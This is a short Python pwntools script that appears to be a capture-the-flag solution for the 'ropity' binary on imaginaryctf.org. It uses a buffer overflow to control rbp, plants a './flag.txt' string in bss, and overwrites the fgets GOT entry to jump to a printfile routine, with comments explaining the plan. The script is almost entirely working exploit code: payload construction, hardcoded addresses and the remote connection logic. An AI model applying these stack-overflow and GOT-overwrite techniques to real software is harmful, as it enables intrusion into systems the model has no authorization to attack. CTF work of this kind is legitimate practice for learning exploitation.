from pwn import *
import sys

#Cre: vilex1337

_path = "./vuln"
exe = ELF(_path)
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")
add = 'ropity.chal.imaginaryctf.org'
port = 1337
cmd = '''
    b *main + 38
    continue
'''

_option = {'run' : process(_path),
           'exp' : remote(add, port)}

def conn():
    if(len(sys.argv) == 1):
        return gdb.debug(_path, cmd)
    return _option[sys.argv[1]]

def p(_data):
    return p64(_data, endian = 'little')

chall = conn()

def check():
    chall.interactive()
    exit()

def main():
    _fgets_got = 0x404018
    _printfile = 0x40115d
    _main = 0x401136
    _bss = 0x404108
    #This challenge allow us to bof, so that we can control rbp and then where we can write to.
    #My idea is that prepare a ./flag.txt string at _bss first, then overwrite _fgets_got so that after setup rax and rdi point to 
    #./flag.txt i setup, it would call printfile and got the flag.
    payload = b'0' * 8 + p(_bss) + p(_main + 12)
    sleep(1)
    chall.sendline(payload)
    payload = b'0' * 8 + p(_fgets_got + 8) + p(_main + 12) + b'./flag.txt\x00'
    sleep(1)
    chall.sendline(payload)
    payload = p(_printfile) + p(_bss + 0x18) + p(_main + 12)
    sleep(1)
    chall.sendline(payload)
    chall.interactive()


if __name__ == "__main__":
    main()
